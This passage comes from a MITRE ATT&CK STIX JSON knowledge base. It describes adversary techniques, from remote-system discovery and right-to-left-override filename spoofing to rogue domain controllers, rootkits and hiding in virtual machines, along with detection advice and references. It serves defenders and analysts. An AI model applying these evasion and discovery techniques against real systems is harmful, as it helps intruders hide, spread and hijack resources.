Services)\",\"external_references\":[{\"external_id\":\"T1021\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"},{\"description\":\"SSH.COM. (n.d.). SSH (Secure Shell). Retrieved March 23, 2020.\",\"source_name\":\"SSH Secure Shell\",\"url\":\"https://www.ssh.com/ssh\"},{\"description\":\"Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.\",\"source_name\":\"TechNet Remote Desktop Services\",\"url\":\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\"}],\"id\":\"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-25T12:25:03.251Z\",\"name\":\"Remote Services\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Windows event logs\",\"Process use of network\",\"Process monitoring\",\"Process command-line parameters\",\"PowerShell logs\",\"Packet capture\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"File monitoring\",\"DLL monitoring\",\"Authentication logs\",\"API monitoring\"],\"x_mitre_detection\":\"Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Active remote service accepting connections and valid credentials\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:28.187Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\\\\Windows\\\\System32\\\\Drivers\\\\etc\\\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. \\n\\nSpecific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.\\n\\nWithin IaaS (Infrastructure as a Service) environments, remote systems include instances and virtual machines in various states, including the running or stopped state. Cloud providers have created methods to serve information about remote systems, such as APIs and CLIs. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API and a <code>describe-instances</code> command within the AWS CLI that can return information about all instances within an account.(Citation: Amazon Describe Instances API)(Citation: Amazon Describe Instances CLI) Similarly, GCP\'s Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project, and Azure\'s CLI <code>az vm list</code> lists details of virtual machines.(Citation: Google Compute Instances)(Citation: Azure VM List)\",\"external_references\":[{\"external_id\":\"T1018\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1018\"},{\"external_id\":\"CAPEC-292\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/292.html\"},{\"description\":\"Amazon. (n.d.). DescribeInstances. Retrieved May 26, 2020.\",\"source_name\":\"Amazon Describe Instances API\",\"url\":\"https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstances.html\"},{\"description\":\"Amazon. (n.d.). describe-instances. Retrieved May 26, 2020.\",\"source_name\":\"Amazon Describe Instances CLI\",\"url\":\"https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-instances.html\"},{\"description\":\"Google. (n.d.). gcloud compute instances list. Retrieved May 26, 2020.\",\"source_name\":\"Google Compute Instances\",\"url\":\"https://cloud.google.com/sdk/gcloud/reference/compute/instances/list\"},{\"description\":\"Microsoft. (n.d.). az vm. Retrieved May 26, 2020.\",\"source_name\":\"Azure VM List\",\"url\":\"https://docs.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest\"}],\"id\":\"attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-05-26T15:02:19.656Z\",\"name\":\"Remote System Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\",\"RedHuntLabs, @redhuntlabs\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"Stackdriver logs\",\"AWS CloudTrail logs\",\"Network protocol analysis\",\"Process monitoring\",\"Process use of network\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nIn cloud environments, the usage of particular commands or APIs to request information about remote systems may be common. Where possible, anomalous usage of these commands and APIs or the usage of these commands and APIs in conjunction with additional unexpected commands may be a sign of malicious use. Logging methods provided by cloud providers that capture history of CLI commands executed or API usage may be utilized for detection.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"GCP\",\"Azure\",\"AWS\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2020-02-10T20:03:11.691Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)\",\"external_references\":[{\"external_id\":\"T1036.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036/003\"},{\"description\":\"LOLBAS. (n.d.). Living Off The Land Binaries and Scripts (and also Libraries). Retrieved February 10, 2020.\",\"source_name\":\"LOLBAS Main Site\",\"url\":\"https://lolbas-project.github.io/\"},{\"description\":\"Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.\",\"source_name\":\"Endgame Masquerade Ball\",\"url\":\"http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf\"},{\"description\":\"F-Secure Labs. (2015, April 22). CozyDuke: Malware Analysis. Retrieved December 10, 2015.\",\"source_name\":\"F-Secure CozyDuke\",\"url\":\"https://www.f-secure.com/documents/996508/1030745/CozyDuke\"},{\"description\":\"Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.\",\"source_name\":\"Twitter ItsReallyNick Masquerading Update\",\"url\":\"https://twitter.com/ItsReallyNick/status/1055321652777619457\"}],\"id\":\"attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-02-10T20:03:11.691Z\",\"name\":\"Rename System Utilities\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Binary file metadata\"],\"x_mitre_detection\":\"If file names are mismatched between the file name on disk and that of the binary\'s PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:08.977Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media\'s firmware itself.\",\"external_references\":[{\"external_id\":\"T1091\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1091\"}],\"id\":\"attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2019-07-18T17:52:28.429Z\",\"name\":\"Replication Through Removable Media\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Data loss prevention\"],\"x_mitre_detection\":\"Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Removable media allowed, Autorun enabled or vulnerability present that allows for code execution\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-17T14:50:05.682Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \\n\\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions) systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.\",\"external_references\":[{\"external_id\":\"T1496\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1496\"},{\"description\":\"GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved April 17, 2019.\",\"source_name\":\"Kaspersky Lazarus Under The Hood Blog 2017\",\"url\":\"https://securelist.com/lazarus-under-the-hood/77908/\"},{\"description\":\"CloudSploit. (2019, June 8). The Danger of Unused AWS Regions. Retrieved October 8, 2019.\",\"source_name\":\"CloudSploit - Unused AWS Regions\",\"url\":\"https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc\"}],\"id\":\"attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2019-10-10T18:40:46.985Z\",\"name\":\"Resource Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Azure activity logs\",\"Stackdriver logs\",\"AWS CloudTrail logs\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\",\"Network device logs\"],\"x_mitre_detection\":\"Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2019-09-04T14:37:07.959Z\",\"external_references\":[{\"external_id\":\"T1536\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1536\"},{\"description\":\"Hardiman, N.. (2012, March 20). Backing up and restoring snapshots on Amazon EC2 machines. Retrieved October 8, 2019.\",\"source_name\":\"Tech Republic - Restore AWS Snapshots\",\"url\":\"https://www.techrepublic.com/blog/the-enterprise-cloud/backing-up-and-restoring-snapshots-on-amazon-ec2-machines/\"},{\"description\":\"Google. (2019, October 7). Restoring and deleting persistent disk snapshots. Retrieved October 8, 2019.\",\"source_name\":\"Google - Restore Cloud Snapshot\",\"url\":\"https://cloud.google.com/compute/docs/disks/restore-and-delete-snapshots\"}],\"id\":\"attack-pattern--3b4121aa-fc8b-40c8-ac4f-afcb5838b72c\",\"modified\":\"2020-06-16T18:44:16.145Z\",\"name\":\"Revert Cloud Instance\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-06-16T18:42:20.734Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\\n\\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)\",\"external_references\":[{\"external_id\":\"T1578.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1578/004\"},{\"description\":\"Hardiman, N.. (2012, March 20). Backing up and restoring snapshots on Amazon EC2 machines. Retrieved October 8, 2019.\",\"source_name\":\"Tech Republic - Restore AWS Snapshots\",\"url\":\"https://www.techrepublic.com/blog/the-enterprise-cloud/backing-up-and-restoring-snapshots-on-amazon-ec2-machines/\"},{\"description\":\"Google. (2019, October 7). Restoring and deleting persistent disk snapshots. Retrieved October 8, 2019.\",\"source_name\":\"Google - Restore Cloud Snapshot\",\"url\":\"https://cloud.google.com/compute/docs/disks/restore-and-delete-snapshots\"}],\"id\":\"attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-17T17:36:24.531Z\",\"name\":\"Revert Cloud Instance\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Netskope\"],\"x_mitre_data_sources\":[\"Stackdriver logs\",\"GCP audit logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-10T19:55:29.385Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver executable named <code>March 25 \\\\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.\\n\\nA common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.\",\"external_references\":[{\"external_id\":\"T1036.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036/002\"},{\"description\":\"Security Ninja. (2015, April 16). Spoof Using Right to Left Override (RTLO) Technique. Retrieved April 22, 2019.\",\"source_name\":\"Infosecinstitute RTLO Technique\",\"url\":\"https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/\"},{\"description\":\"Alintanahin, K.. (2014, May 23). PLEAD Targeted Attacks Against Taiwanese Government Agencies. Retrieved April 22, 2019.\",\"source_name\":\"Trend Micro PLEAD RTLO\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/plead-targeted-attacks-against-taiwanese-government-agencies-2/\"},{\"description\":\"Firsh, A.. (2018, February 13). Zero-day vulnerability in Telegram - Cybercriminals exploited Telegram flaw to launch multipurpose attacks. Retrieved April 22, 2019.\",\"source_name\":\"Kaspersky RTLO Cyber Crime\",\"url\":\"https://securelist.com/zero-day-vulnerability-in-telegram/83800/\"}],\"id\":\"attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T20:16:36.316Z\",\"name\":\"Right-to-Left Override\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\"],\"x_mitre_detection\":\"Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\\\\u202E</code>, <code>[U+202E]</code>, and <code>%E2%80%AE</code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\\n\\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\\n\\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)\",\"external_references\":[{\"external_id\":\"T1207\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1207\"},{\"description\":\"Delpy, B. & LE TOUX, V. (n.d.). DCShadow. Retrieved March 20, 2018.\",\"source_name\":\"DCShadow Blog\",\"url\":\"https://www.dcshadow.com/\"},{\"description\":\"Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.\",\"source_name\":\"Adsecurity Mimikatz Guide\",\"url\":\"https://adsecurity.org/?page_id=1821\"},{\"description\":\"Spencer S. (2018, February 22). DCSYNCMonitor. Retrieved March 30, 2018.\",\"source_name\":\"GitHub DCSYNCMonitor\",\"url\":\"https://github.com/shellster/DCSYNCMonitor\"},{\"description\":\"Microsoft. (n.d.). Polling for Changes Using the DirSync Control. Retrieved March 30, 2018.\",\"source_name\":\"Microsoft DirSync\",\"url\":\"https://msdn.microsoft.com/en-us/library/ms677626.aspx\"},{\"description\":\"Lucand,G. (2018, February 18). Detect DCShadow, impossible?. Retrieved March 30, 2018.\",\"source_name\":\"ADDSecurity DCShadow Feb 2018\",\"url\":\"https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html\"}],\"id\":\"attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-19T21:04:12.164Z\",\"name\":\"Rogue Domain Controller\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Vincent Le Toux\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Authentication logs\",\"Network protocol analysis\",\"Packet capture\"],\"x_mitre_defense_bypassed\":[\"Log analysis\"],\"x_mitre_detection\":\"Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\\n\\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\\n\\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\\n\\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:30:26.496Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \\n\\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)\",\"external_references\":[{\"external_id\":\"T1014\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1014\"},{\"external_id\":\"CAPEC-552\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/552.html\"},{\"description\":\"Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.\",\"source_name\":\"Symantec Windows Rootkits\",\"url\":\"https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf\"},{\"description\":\"Wikipedia. (2016, June 1). Rootkit. Retrieved June 2, 2016.\",\"source_name\":\"Wikipedia Rootkit\",\"url\":\"https://en.wikipedia.org/wiki/Rootkit\"},{\"description\":\"Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.\",\"source_name\":\"CrowdStrike Linux Rootkit\",\"url\":\"https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/\"},{\"description\":\"Pan, M., Tsai, S. (2014). You can’t see me: A Mac OS X Rootkit uses the tricks you haven\'t known yet. Retrieved December 21, 2017.\",\"source_name\":\"BlackHat Mac OSX Rootkit\",\"url\":\"http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf\"}],\"id\":\"attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:29:55.496Z\",\"name\":\"Rootkit\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"BIOS\",\"MBR\",\"System calls\"],\"x_mitre_defense_bypassed\":[\"File monitoring\",\"Host intrusion prevention systems\",\"Application control\",\"Signature-based detection\",\"System access controls\",\"Application control by file name or path\",\"Anti-virus\"],\"x_mitre_detection\":\"Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-06-29T15:36:41.535Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)\\n\\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)\",\"external_references\":[{\"external_id\":\"T1564.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564/006\"},{\"description\":\"Committee of Inquiry into the Cyber Attack on SingHealth. (2019, January 10). Public Report of the Committee of Inquiry into the Cyber Attack on Singapore Health Services Private Limited\'s Patient Database. Retrieved June 29, 2020.\",\"source_name\":\"SingHealth Breach Jan 2019\",\"url\":\"https://www.mci.gov.sg/-/media/mcicorp/doc/report-of-the-coi-into-the-cyber-attack-on-singhealth-10-jan-2019.ashx\"},{\"description\":\"SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020.\",\"source_name\":\"Sophos Ragnar May 2020\",\"url\":\"https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\"}],\"id\":\"attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-07-06T19:03:40.330Z\",\"name\":\"Run Virtual Instance\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Janantha Marasinghe\",\"Menachem Shafran, XM Cyber\"],\"x_mitre_data_sources\":[\"Packet capture\",\"Host network interface\",\"Windows Registry\",\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a headless (in the background with no UI) virtual instance may be especially suspect. Network adapter information may also be helpful in detecting the use of virtual instances.\\n\\nIf virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. \\n\\nBenign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of 